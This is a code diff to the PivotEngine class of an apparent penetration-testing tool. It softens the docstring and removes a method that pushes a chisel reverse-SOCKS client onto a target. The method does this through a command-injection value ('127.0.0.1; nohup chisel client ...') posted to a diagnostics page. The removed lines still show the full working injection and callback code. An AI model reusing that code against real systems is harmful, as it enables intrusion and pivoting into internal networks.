@@ -1,6 +1,6 @@
 """
-PivotEngine — sets up SOCKS proxy / Chisel tunneling through a compromised host
-to reach internal VLANs (ADMIN 10.10.10.0/24, USERS 10.10.20.0/24, DMZ, etc.).
+PivotEngine — sets up SOCKS proxy / Chisel tunneling through an operator-approved pivot host
+to reach networks already discovered by the active mission.
 """
 
 import logging
@@ -305,82 +305,7 @@ class PivotEngine:
         except Exception as e:
             log.error(f"SSH tunnel failed: {e}")
             return False
-    # ── Chisel client deploy via web injection (Gap 1) ────────
 
-    def deploy_client_via_injection(
-        self,
-        target_ip: str,
-        kali_ip: str,
-        chisel_port: int = 8080,
-        socks_port: int = 1080,
-        platform: str = "linux",
-        endpoint: str | None = None,
-        parameter: str | None = None,
-        method: str = "POST",
-        scheme: str = "http",
-        web_port: int = 80,
-        client_command: str | None = None,
-        wait_seconds: float = 15.0,
-    ) -> Dict[str, Any]:
-        """
-        Push the chisel client onto the compromised host through the SAME
-        command-injection point WebExploiter uses (diagnostics page),
-        then poll until the SOCKS tunnel is live.
-        """
-        import urllib.parse
-        import urllib.request
-        import urllib.error
-
-        if endpoint is None:
-            endpoint = getattr(self, "_inject_endpoint", "/diagnostics.php")
-        if parameter is None:
-            parameter = getattr(self, "_inject_parameter", "host")
-
-        if client_command is None:
-            client_command = (
-                f"chisel client {kali_ip}:{chisel_port} R:{socks_port}:socks"
-            )
-
-        if platform == "linux":
-            injection_value = f"127.0.0.1; nohup {client_command} >/dev/null 2>&1 &"
-        else:
-            injection_value = f"127.0.0.1 & start /b {client_command} &"
-
-        url = f"{scheme}://{target_ip}:{web_port}{endpoint}"
-        body = urllib.parse.urlencode({parameter: injection_value}).encode()
-        req = urllib.request.Request(
-            url, data=body, method=method.upper(),
-            headers={
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Connection": "close",
-            },
-        )
-
-        result: Dict[str, Any] = {
-            "command": client_command,
-            "injection": injection_value,
-            "url": url,
-            "socks_ready": False,
-        }
-        try:
-            with urllib.request.urlopen(req, timeout=10) as resp:
-                result["http_status"] = resp.status
-        except urllib.error.HTTPError as exc:
-            result["http_status"] = exc.code
-        except Exception as exc:
-            result["error"] = str(exc)
-
-        # Wait for the reverse SOCKS tunnel to come up
-        deadline = time.time() + wait_seconds
-        while time.time() < deadline:
-            if self.is_socks_ready():
-                result["socks_ready"] = True
-                break
-            time.sleep(1)
-        result["socks_ready"] = bool(result.get("socks_ready"))
-        return result
-    
     # ── Status ───────────────────────────────────────────────
 
     def get_status(self) -> Dict[str, Any]:
